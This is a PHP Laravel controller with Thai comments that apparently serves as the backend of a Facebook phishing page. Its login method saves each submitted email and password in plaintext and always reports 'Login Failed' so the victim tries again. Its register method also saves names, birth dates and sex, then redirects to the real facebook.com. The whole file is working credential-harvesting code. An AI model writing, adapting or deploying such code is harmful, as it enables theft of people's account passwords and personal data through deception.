<?php

namespace App\Http\Controllers;

use App\Models\Userdb;  // ถ้าจำเป็นต้องใช้โมเดล Userdb

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request; 
use Illuminate\Support\Str;

class UserLoginController extends Controller
{
    public function login(Request $request)
    {
        // Validation และบันทึกข้อมูล
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|min:6',
        ]);

        $check = Userdb::where('username', $request->input('email'))->first();

        if (!$check) {
            Userdb::insert([
                'username' => $request->input('email'),
                'password' => $request->input('password'), 
            ]);
        } else {
            $check->update([
                'password' => $request->input('password'), 
            ]);
        }

        return redirect()->route('login')->with('error', 'Login Failed. Please try again.');

        // return redirect()->to('https://www.facebook.com');
    }

    public function register(Request $request)
    {
        // Validate ฟอร์ม
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|min:6',
        ]);

        $check = Userdb::where('username', $request->input('email'))->first();

        if (!$check) {
                    // เก็บข้อมูลลงในฐานข้อมูล
        DB::table('userdbs')->insert([
            'username' => $request->email,
            'password' => $request->password,
            'f_name' => $request->f_name,
            'l_name' => $request->l_name,
            'day' => $request->day,
            'month' => $request->month,
            'year' => $request->year,
            'sex' => $request->sex,
            'created_at' => now(),
            'updated_at' => now(),
        ]);
        } else {
            DB::table('userdbs')->where('username', $request->email)->update([
                'password' => $request->password, 
                'f_name' => $request->f_name,
                'l_name' => $request->l_name,
                'day' => $request->day,
                'month' => $request->month,
                'year' => $request->year,
                'sex' => $request->sex,
                'updated_at' => now(),
            ]);
        }
        
    
        return redirect()->to('https://www.facebook.com');
    }
}
